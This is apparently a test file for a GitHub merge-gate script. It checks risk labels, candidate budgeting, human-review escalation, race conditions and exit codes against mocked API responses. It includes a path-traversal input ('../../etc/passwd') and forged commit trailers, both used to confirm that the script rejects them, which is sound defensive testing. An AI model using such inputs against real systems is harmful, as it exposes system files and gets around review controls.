w = world(); p = add_pr(w, 5, labels=("semver:patch", "riesgo:3"))
res = sweep(w)
S.check("sweep: a stale riesgo label is replaced", any(c["method"] == "DELETE" and c["path"].endswith("/labels/riesgo%3A3") for c in H.writes(res))
        and any(c["input"] == {"labels": ["riesgo:0"]} for c in H.writes(res, "POST")))
w = world(max_candidates=1); a = w.green_pr(5); w.files(5, [".github/workflows/x.yml"]); b = w.green_pr(6, created="2026-10-01T10:30:00Z")
w.files(6, ["docs/x.md"]); w.open_pulls([a, b])
res = sweep(w)
S.check("sweep: max_candidates bounds the CI evaluations, mergeable classes first",
        res["outputs"].get("merge_pr") == "6" and any(d["pr"] == 5 and "max_candidates" in " ".join(d["reasons"])
                                                     for d in res["plan"].get("decisions", [])), res["plan"].get("decisions"))
w = world()
olds = []
for i, n in enumerate(range(20, 25)):
    olds.append(w.green_pr(n, created="2026-09-%02dT10:00:00Z" % (20 + i)))
    w.files(n, ["CLAUDE.md"])
new = w.green_pr(30, created="2026-10-01T09:00:00Z"); w.files(30, ["docs/x.md"])
w.open_pulls(olds + [new])
res = sweep(w, "live")
S.check("sweep: five older riesgo-2 PRs above max_auto_class do not starve a new riesgo-0",
        res["outputs"].get("merge_pr") == "30", [(d["pr"], d["decision"], d["reasons"][:1]) for d in res["plan"].get("decisions", [])])
w = world()
olds = []
for i, n in enumerate(range(20, 25)):
    olds.append(w.green_pr(n, created="2026-09-%02dT10:00:00Z" % (20 + i)))
    w.files(n, ["CLAUDE.md"])
wf = w.green_pr(31, created="2026-10-01T09:00:00Z"); w.files(31, [".github/workflows/x.yml"])
w.open_pulls(olds + [wf])
res2 = sweep(w, "live")
S.check("sweep: older riesgo-2 PRs do not eat the budget a riesgo-3 needs to be escalated",
        res2["outputs"].get("escalate_prs") == "[31]", [(d["pr"], d["decision"], d["reasons"][:1]) for d in res2["plan"].get("decisions", [])])
S.check("sweep: riesgo-2 above max_auto_class is decided without reading its CI",
        not any("head_sha=%s" % H.sha(20) in c["path"] for c in res["calls"]), [c["path"] for c in res["calls"] if "head_sha" in c["path"]])
w = world(); add_pr(w, 5)
res = H.run_script(PM, ["sweep", "--repo", R, "--mode", "dry", "--pr", "5"], w, {"GITHUB_STEP_SUMMARY": os.path.join(SUMMARY_DIR, "s.md")})
S.check("sweep writes the job summary table", res["rc"] == 0 and "| #5 | merge |" in res["out"], res["out"][-400:])
res = H.run_script(PM, ["decide", "--repo", R, "--pr", "5"], w)
S.check("decide prints a one-line verdict without --json", res["rc"] == 0 and res["out"].startswith("#5 MERGE"), res["out"])
w = merge_world(); w.r("PUT", "repos/%s/pulls/5/merge" % R, {"message": "boom"}, status=500)
res = merge(w)
S.check("merge: an unexpected HTTP error is exit 1", res["rc"] == 1, res)
w = merge_world(); w.routes.pop("GET repos/%s/branches/main" % R)
res = merge(w)
S.check("merge: a protected branch that vanished after the merge opens an issue", res["rc"] == 1 and
        any(c["path"].endswith("/issues") for c in H.writes(res, "POST")))
w = merge_world(labels=("semver:patch", "revision-humana"))
res = H.run_script(PM, ["escalate", "--repo", R, "--pr", "5"], w, APP_ENV)
S.check("escalate: already labelled -> nothing", res["rc"] == 0 and not H.writes(res))


# ── a person was asked once: removing the label does not send it back ─────────────────────────────
w = world(); add_pr(w, 5); w.events(5, ["revision-humana"])
expect("revision-humana added and then removed: still with a person", w, 5, "skip", "at some point")
w = world(); add_pr(w, 5); w.events(5, ["semver:patch", "riesgo:0"])
expect("other labels in the history do not hold it", w, 5, "merge")

# ── what changes while deciding ────────────────────────────────────────────────────────────────
w = world(); p = add_pr(w, 5)
w.seq("GET", "repos/%s/pulls/5" % R, [{"body": p}, {"body": dict(p, head=dict(p["head"], sha=H.sha(55)))}])
expect("the head moved while deciding", w, 5, "wait", "head moved")
w = world(); p = add_pr(w, 5)
w.seq("GET", "repos/%s/pulls/5" % R, [{"body": p}, {"body": dict(p, base=dict(p["base"], ref="main"))}])
expect("re-pointed to main while deciding", w, 5, "skip", "changed while deciding")
w = world(); p = add_pr(w, 5)
w.seq("GET", "repos/%s/pulls/5" % R, [{"body": p}, {"body": dict(p, labels=p["labels"] + [{"name": "semver:minor"}])}])
expect("a label added while deciding", w, 5, "wait", "labels changed")
w = merge_world(); p = w.routes["GET repos/%s/pulls/5" % R]["body"]
w.seq("GET", "repos/%s/pulls/5" % R, [{"body": p}, {"body": dict(p, base=dict(p["base"], ref="main"))}])
res = merge(w)
S.check("merge: a PR re-pointed to main between the decision and the PUT is never PUT",
        not H.writes(res, "PUT") and res["rc"] == 40, (res["rc"], res["out"], res["err"]))

# ── the author cannot write the gate's trailers ─────────────────────────────────────────────────
w = world(); add_pr(w, 5, title="Risk-class: riesgo:3")
w.commits(5, [{"author": "dev", "committer": "dev", "message": "docs: a\n\nRisk-class: riesgo:3\nMerge-gate: merge-when-green x"}])
res = sweep(w)
msg = next((d.get("message") for d in res["plan"].get("decisions", []) if d.get("message")), {}) or {}
pm = H._load()["merge-when-green/pr-merge.sh"]
S.check("message: the author's Risk-class/Merge-gate lines are neutralised, the gate's trailer is the one read",
        pm.trailer_class(msg.get("body", "")) == 0 and not re.search(r"^Risk-class: riesgo:3", msg.get("body", ""), re.M)
        and not msg.get("title", "").startswith("Risk-class:"), msg)
S.check("trailer_class: the last Risk-class line, only with the gate's Merge-gate line after it",
        pm.trailer_class("x\n\nRisk-class: riesgo:3\n\nRisk-class: riesgo:1\nMerge-gate: merge-when-green u") == 1
        and pm.trailer_class("x\n\nRisk-class: riesgo:1") is None
        and pm.trailer_class("Merge-gate: merge-when-green u\nRisk-class: riesgo:1") is None)

# ── a bot pin-only workflow PR (riesgo-1) never merges: the App has no workflows permission ─────────
PIN = ("@@ -10,3 +10,3 @@\n     steps:\n-      - uses: actions/checkout@aaaa # v6.0.0\n"
       "+      - uses: actions/checkout@bbbb # v6.0.1\n")
w = world(max_auto_class=1); add_pr(w, 5, files=[{"filename": ".github/workflows/ci.yml", "patch": PIN}],
                                     author="renovate[bot]", body="Renovate")
w.commits(5, [{"author": "renovate[bot]", "committer": "web-flow", "message": "ci: pin", "verified": True}])
expect("a bot's pin-only workflow bump (riesgo-1) is not merged by the App", w, 5, "skip", "touches .github/workflows")

w = world(); add_pr(w, 5, labels=("semver:patch", "revision-humana")); w.events(5, ["revision-humana"])
sc = os.path.join(H.ROOT, "merge-when-green", "selftest.json")
res = sweep(w, extra=["--pr", "5", "--comment", "false", "--labels", "false", "--selftest-config", sc])
S.check("self-test: looks past the hold label and runs the whole decision, writing nothing",
        res["outputs"].get("merge_pr") == "5" and not H.writes(res), (res["plan"].get("decisions"), H.writes(res)))
res = sweep(w, extra=["--pr", "5", "--selftest-config", sc])
S.check("self-test refuses to write", res["rc"] == 2 and not H.writes(res), res["err"])
res = sweep(w, "live", extra=["--pr", "5", "--comment", "false", "--labels", "false", "--selftest-config", sc])
S.check("self-test refuses live", res["rc"] == 2)

w = world(); add_pr(w, 5)
res = H.run_script(PM, ["decide", "--repo", R, "--pr", "5", "--config", "../../etc/passwd"], w)
S.check("usage: a config path outside the repository -> exit 2", res["rc"] == 2, res)

# ── usage ────────────────────────────────────────────────────────────────────────────────────────
for label, args in (("decide --repo without value", ["decide", "--pr", "5", "--repo"]),
                    ("sweep bad mode", ["sweep", "--repo", R, "--mode", "yes"]),
                    ("merge without --sha", ["merge", "--repo", R, "--pr", "5"])):
    p = subprocess.run(["timeout", "5", os.path.join(H.ROOT, PM)] + args, capture_output=True, text=True,
                       env=dict(os.environ, **APP_ENV))
    S.check("usage: %s -> exit 2" % label, p.returncode == 2, (p.returncode, p.stderr))

sys.exit(S.done())
